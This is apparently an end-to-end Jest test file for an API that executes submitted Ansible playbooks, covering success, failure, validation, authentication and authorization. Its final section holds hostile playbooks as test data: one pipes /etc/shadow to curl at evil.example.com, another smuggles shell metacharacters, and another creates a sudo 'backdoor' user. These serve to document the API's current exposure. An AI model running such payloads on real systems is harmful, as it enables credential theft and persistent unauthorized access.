import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  jest,
} from '@jest/globals';
import { load } from 'js-yaml';
import {
  InfrastructureDepartment,
  InfrastructureOperationsLogEntity,
} from '../../src/common/database/infrastructure-operatios-log.entity';
import {
  AppTestApp,
  createAppTestApp,
  expectedAnsibleArgs,
  TEST_SSH_PRIVATE_KEY,
} from '../helpers/app-test-app';
import {
  ansibleChangedOutput,
  ansibleFatalOutput,
} from '../helpers/ansible-output';
import {
  ADMIN_AUTHORIZATION,
  authorizationHeaderFor,
  authorizationHeaderForClaims,
  expiredAdminAuthorizationHeader,
  unknownKidAdminAuthorizationHeader,
  wrongKeyAdminAuthorizationHeader,
} from '../helpers/test-auth';

const ENDPOINT = '/server-hub-api/manage-server';

const PLAYBOOK = `- hosts: all
  become: true
  gather_facts: false
  tasks:
    - name: Restart nginx
      ansible.builtin.service:
        name: nginx
        state: restarted
`;

function validBody(overrides: Record<string, unknown> = {}) {
  return {
    numberOfTickets: 42,
    playbook: PLAYBOOK,
    ...overrides,
  };
}

describe('POST /server-hub-api/manage-server (e2e)', () => {
  let testApp: AppTestApp;

  beforeAll(async () => {
    testApp = await createAppTestApp();
  });

  beforeEach(async () => {
    await testApp.resetState();
  });

  afterEach(() => {
    // The stub is the only exec path: nothing may have used node:child_process
    // and every file must have been written (and removed) inside the temp dir.
    testApp.assertNoRealProcess();
    expect(testApp.leftoverTempEntries()).toEqual([]);
  });

  afterAll(async () => {
    await testApp.close();
  });

  function post(
    body: unknown,
    authorization: string | null = ADMIN_AUTHORIZATION,
  ) {
    const req = testApp.http().post(ENDPOINT);
    if (authorization) {
      req.set('Authorization', authorization);
    }
    return req.send(body as object);
  }

  describe('success', () => {
    it('returns 201 with the execution result and the id of the persisted log', async () => {
      const stdout = ansibleChangedOutput('Restart nginx');
      testApp.process.succeedWith(stdout, 'a warning');

      const response = await post(validBody()).expect(201);

      expect(response.body).toEqual({
        executionResult: {
          success: true,
          stdout,
          stderr: 'a warning',
          exitCode: 0,
        },
        logId: expect.stringMatching(/^[0-9a-f-]{36}$/),
      });
    });

    it('hands ansible-playbook the exact args, timeout, the playbook byte for byte and the SSH key', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      await post(validBody()).expect(201);

      expect(testApp.process.calls).toHaveLength(1);
      const [call] = testApp.process.calls;
      expect(call.command).toBe('ansible-playbook');
      expect(call.args).toEqual(expectedAnsibleArgs(call));
      expect(call.options).toEqual({ timeout: 240000 });
      expect(call.playbook).toBe(PLAYBOOK);
      expect(call.sshKey).toBe(TEST_SSH_PRIVATE_KEY);
      expect(call.sshKeyMode).toBe(0o600);
    });

    it('persists one SERVER operations log row with the playbook and the response', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      const response = await post(validBody()).expect(201);

      const rows = await testApp.logRows();
      expect(rows).toHaveLength(1);
      expect(rows[0].id).toBe(response.body.logId);
      expect(rows[0].department).toBe(InfrastructureDepartment.SERVER);
      expect(rows[0].numberOfTicket).toBe(42);
      expect(JSON.parse(rows[0].instruction)).toEqual({ playbook: PLAYBOOK });
      expect(JSON.parse(rows[0].response)).toEqual(
        response.body.executionResult,
      );
    });

    it('does not echo the SSH private key in the response nor in the log', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      const response = await post(validBody()).expect(201);

      const [row] = await testApp.logRows();
      expect(JSON.stringify(response.body)).not.toContain('not-a-real-key');
      expect(row.instruction + row.response).not.toContain('not-a-real-key');
    });
  });

  describe('process layer failures', () => {
    it('returns 201 with success false and logs it when ansible-playbook exits non-zero', async () => {
      const stdout = ansibleFatalOutput('Restart nginx', {
        msg: 'Could not find the requested service nginx',
      });
      testApp.process.failWith({ code: 2, stdout, stderr: 'ERROR! boom' });

      const response = await post(validBody()).expect(201);

      expect(response.body.executionResult).toEqual({
        success: false,
        stdout,
        stderr: 'ERROR! boom',
        exitCode: 2,
        errorMessage: 'Command failed: ansible-playbook',
        errorCode: 2,
      });
      const rows = await testApp.logRows();
      expect(rows).toHaveLength(1);
      expect(rows[0].id).toBe(response.body.logId);
      expect(JSON.parse(rows[0].response)).toEqual(
        response.body.executionResult,
      );
    });

    it('reports a string exit code (timeout) as is', async () => {
      testApp.process.failWith({
        message: 'Command failed: timed out',
        code: 'ETIMEDOUT',
      });

      const response = await post(validBody()).expect(201);

      expect(response.body.executionResult).toEqual(
        expect.objectContaining({
          success: false,
          exitCode: 'ETIMEDOUT',
          errorCode: 'ETIMEDOUT',
        }),
      );
    });

    it('documents current behavior: a non-ExecFileError from the exec layer becomes a 500 and nothing is logged', async () => {
      testApp.process.throwWith(new Error('spawn ansible-playbook ENOENT'));

      const response = await post(validBody()).expect(500);

      expect(response.body).toEqual({
        statusCode: 500,
        message: 'Internal server error',
      });
      expect(testApp.process.calls).toHaveLength(1);
      expect(await testApp.logRows()).toEqual([]);
    });
  });

  describe('database failure after execution', () => {
    it('documents current behavior: when saving the log fails the operation already ran, the caller gets 500 and no row exists', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));
      const repository = testApp.dataSource.getRepository(
        InfrastructureOperationsLogEntity,
      );
      const saveSpy = jest
        .spyOn(repository, 'save')
        .mockRejectedValueOnce(new Error('connection terminated unexpectedly'));

      try {
        const response = await post(validBody()).expect(500);

        expect(response.body).toEqual({
          statusCode: 500,
          message: 'Internal server error',
        });
        expect(saveSpy).toHaveBeenCalledTimes(1);
        // The side effect has already happened on the target host.
        expect(testApp.process.calls).toHaveLength(1);
        expect(await testApp.logRows()).toEqual([]);
      } finally {
        saveSpy.mockRestore();
      }
    });
  });

  describe('playbook content checks done by AnsibleValidator', () => {
    it('documents current behavior: syntactically invalid YAML is a plain Error, so 500, and nothing runs nor is logged', async () => {
      const response = await post(
        validBody({ playbook: '- hosts: [all\n  tasks:' }),
      ).expect(500);

      expect(response.body).toEqual({
        statusCode: 500,
        message: 'Internal server error',
      });
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });

    it('documents current behavior: valid YAML that is not a list of plays is a plain Error, so 500', async () => {
      const response = await post(
        validBody({ playbook: 'hosts: all\ntasks: []\n' }),
      ).expect(500);

      expect(response.body.statusCode).toBe(500);
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });

    it('documents current behavior: a scalar playbook is rejected with 500', async () => {
      await post(validBody({ playbook: 'just some text' })).expect(500);

      expect(testApp.process.calls).toEqual([]);
    });

    it('documents current behavior: a whitespace-only playbook passes DTO validation and is rejected by the validator with 500', async () => {
      await post(validBody({ playbook: '   ' })).expect(500);

      expect(testApp.process.calls).toEqual([]);
    });

    it('documents current behavior: an empty YAML list is accepted and ansible-playbook runs with it', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      await post(validBody({ playbook: '[]' })).expect(201);

      expect(testApp.process.calls).toHaveLength(1);
      expect(testApp.process.calls[0].playbook).toBe('[]');
    });

    it('documents current behavior: a list of non-play items (strings) is accepted', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      await post(validBody({ playbook: '- hello\n- world\n' })).expect(201);

      expect(testApp.process.calls).toHaveLength(1);
    });
  });

  describe('validation', () => {
    it('returns 400 when the body is empty', async () => {
      const response = await post({}).expect(400);

      expect(response.body.message).toEqual(
        expect.arrayContaining([
          'numberOfTickets must be an integer number',
          'playbook must be a string',
        ]),
      );
      expect(testApp.process.calls).toEqual([]);
    });

    it('returns 400 when playbook is missing', async () => {
      const { playbook, ...body } = validBody();
      expect(playbook).toBeDefined();

      const response = await post(body).expect(400);

      expect(response.body.message).toEqual(
        expect.arrayContaining(['playbook must be a string']),
      );
    });

    it('returns 400 when playbook is empty', async () => {
      const response = await post(validBody({ playbook: '' })).expect(400);

      expect(response.body.message).toEqual(['playbook should not be empty']);
    });

    it('returns 400 when playbook is not a string', async () => {
      const response = await post(
        validBody({ playbook: [{ hosts: 'all' }] }),
      ).expect(400);

      expect(response.body.message).toEqual(
        expect.arrayContaining(['playbook must be a string']),
      );
      expect(testApp.process.calls).toEqual([]);
    });

    it('returns 400 when playbook is longer than 20000 characters', async () => {
      const response = await post(
        validBody({ playbook: '- hosts: all\n' + '#'.repeat(20000) }),
      ).expect(400);

      expect(response.body.message).toEqual([
        'playbook must be shorter than or equal to 20000 characters',
      ]);
      expect(testApp.process.calls).toEqual([]);
    });

    it('accepts a playbook of exactly 20000 characters', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));
      const header = '- hosts: all\n#';
      const playbook = header + 'a'.repeat(20000 - header.length);

      await post(validBody({ playbook })).expect(201);

      expect(playbook).toHaveLength(20000);
      expect(testApp.process.calls).toHaveLength(1);
    });

    it('returns 400 on an unknown property', async () => {
      const response = await post(
        validBody({ inventory: 'localhost,' }),
      ).expect(400);

      expect(response.body.message).toEqual([
        'property inventory should not exist',
      ]);
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });
  });

  describe('numberOfTickets validation', () => {
    it('returns 400 when numberOfTickets is missing', async () => {
      const { numberOfTickets, ...body } = validBody();
      expect(numberOfTickets).toBeDefined();

      const response = await post(body).expect(400);

      expect(response.body.message).toEqual(
        expect.arrayContaining([
          'numberOfTickets must be an integer number',
          'numberOfTickets should not be empty',
        ]),
      );
      expect(testApp.process.calls).toEqual([]);
    });

    it('returns 400 when numberOfTickets is null', async () => {
      await post(validBody({ numberOfTickets: null })).expect(400);
      expect(testApp.process.calls).toEqual([]);
    });

    it('returns 400 when numberOfTickets is a numeric string (no implicit conversion)', async () => {
      const response = await post(validBody({ numberOfTickets: '5' })).expect(
        400,
      );

      expect(response.body.message).toEqual([
        'numberOfTickets must be an integer number',
      ]);
      expect(testApp.process.calls).toEqual([]);
    });

    it('returns 400 when numberOfTickets is not an integer', async () => {
      const response = await post(validBody({ numberOfTickets: 1.5 })).expect(
        400,
      );

      expect(response.body.message).toEqual([
        'numberOfTickets must be an integer number',
      ]);
      expect(testApp.process.calls).toEqual([]);
    });

    it('documents current behavior: numberOfTickets 0 is accepted and logged', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      await post(validBody({ numberOfTickets: 0 })).expect(201);

      const rows = await testApp.logRows();
      expect(rows).toHaveLength(1);
      expect(rows[0].numberOfTicket).toBe(0);
      expect(testApp.process.calls).toHaveLength(1);
    });

    it('documents current behavior: a negative numberOfTickets is accepted and logged', async () => {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));

      await post(validBody({ numberOfTickets: -1 })).expect(201);

      const rows = await testApp.logRows();
      expect(rows).toHaveLength(1);
      expect(rows[0].numberOfTicket).toBe(-1);
      expect(testApp.process.calls).toHaveLength(1);
    });
  });

  describe('authentication', () => {
    it('returns 401 when the request has no bearer token', async () => {
      const response = await post(validBody(), null).expect(401);

      expect(response.body.message).toBe('Missing or malformed bearer token');
    });

    it('returns 401 for a non-bearer authorization scheme', async () => {
      const response = await post(validBody(), 'Basic YWRtaW46YWRtaW4=').expect(
        401,
      );

      expect(response.body.message).toBe('Missing or malformed bearer token');
    });

    it('returns 401 for a garbage token', async () => {
      const response = await post(validBody(), 'Bearer not-a-jwt').expect(401);

      expect(response.body.message).toBe('Invalid or expired token');
    });

    it('returns 401 for an expired token', async () => {
      const response = await post(
        validBody(),
        expiredAdminAuthorizationHeader(),
      ).expect(401);

      expect(response.body.message).toBe('Invalid or expired token');
    });

    it('returns 401 for a token signed with the wrong key', async () => {
      const response = await post(
        validBody(),
        wrongKeyAdminAuthorizationHeader(),
      ).expect(401);

      expect(response.body.message).toBe('Invalid or expired token');
    });

    it('returns 401 for a token with an unknown kid', async () => {
      const response = await post(
        validBody(),
        unknownKidAdminAuthorizationHeader(),
      ).expect(401);

      expect(response.body.message).toBe('Invalid or expired token');
    });

    it('authenticates before validating: an invalid payload without token is a 401', async () => {
      await post({}, null).expect(401);
    });

    it('never reaches the process layer nor the log when authentication fails', async () => {
      await post(validBody(), null).expect(401);
      await post(validBody(), 'Bearer not-a-jwt').expect(401);

      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });
  });

  describe('authorization', () => {
    it('returns 403 when the user has no ADMIN role', async () => {
      const response = await post(
        validBody(),
        authorizationHeaderFor({
          email: 'viewer@example.com',
          roles: ['VIEWER'],
        }),
      ).expect(403);

      expect(response.body.message).toBe('You do not have the required role');
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });

    it('returns 403 when the role name differs only in case', async () => {
      await post(
        validBody(),
        authorizationHeaderFor({ email: 'a@example.com', roles: ['admin'] }),
      ).expect(403);
    });

    it('returns 403 when the user has an empty role list', async () => {
      await post(
        validBody(),
        authorizationHeaderFor({ email: 'a@example.com', roles: [] }),
      ).expect(403);
    });

    it('returns 403 when ADMIN was granted for another application', async () => {
      const response = await post(
        validBody(),
        authorizationHeaderFor({
          email: 'admin@example.com',
          roles: ['ADMIN'],
          applicationName: 'iam-api',
        }),
      ).expect(403);

      expect(response.body.message).toBe(
        'This token was not issued for the infra-hub-api application',
      );
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });

    it('documents current behavior: a valid token without the apps claim yields 500, not 403', async () => {
      const response = await post(
        validBody(),
        authorizationHeaderForClaims({ email: 'admin@example.com' }),
      ).expect(500);

      expect(response.body).toEqual({
        statusCode: 500,
        message: 'Internal server error',
      });
      expect(testApp.process.calls).toEqual([]);
      expect(await testApp.logRows()).toEqual([]);
    });

    it('documents current behavior: an apps claim without roles yields 500, not 403', async () => {
      const response = await post(
        validBody(),
        authorizationHeaderForClaims({
          apps: { application: { id: 1, name: 'infra-hub-api-test' } },
        }),
      ).expect(500);

      expect(response.body.statusCode).toBe(500);
      expect(testApp.process.calls).toEqual([]);
    });
  });

  describe('hostile values (documents current behavior)', () => {
    async function run(playbook: string) {
      testApp.process.succeedWith(ansibleChangedOutput('Restart nginx'));
      await post(validBody({ playbook })).expect(201);
      expect(testApp.process.calls).toHaveLength(1);
      return testApp.process.calls[0];
    }

    it('documents current behavior: a play targeting localhost with a local connection is handed to ansible-playbook verbatim (it would run on the API host)', async () => {
      const playbook = `- hosts: localhost
  connection: local
  tasks:
    - ansible.builtin.shell: id > /tmp/pwned
`;

      const call = await run(playbook);

      expect(call.playbook).toBe(playbook);
      expect(call.args).toEqual(expectedAnsibleArgs(call));
    });

    it('documents current behavior: Jinja lookups and shell metacharacters in the playbook reach the file verbatim', async () => {
      const playbook = `- hosts: all
  tasks:
    - ansible.builtin.debug:
        msg: "{{ lookup('pipe','id') }}"
    - ansible.builtin.shell: cat /etc/shadow | curl -d @- http://evil.example.com; $(id) \`id\`
`;

      const call = await run(playbook);

      expect(call.playbook).toBe(playbook);
    });

    it('documents current behavior: privileged tasks (become) are not restricted', async () => {
      const playbook = `- hosts: all
  become: true
  tasks:
    - ansible.builtin.user:
        name: backdoor
        groups: sudo
`;

      const call = await run(playbook);

      expect(call.playbook).toBe(playbook);
      const [row] = await testApp.logRows();
      expect(JSON.parse(row.instruction)).toEqual({ playbook });
    });
  });
});
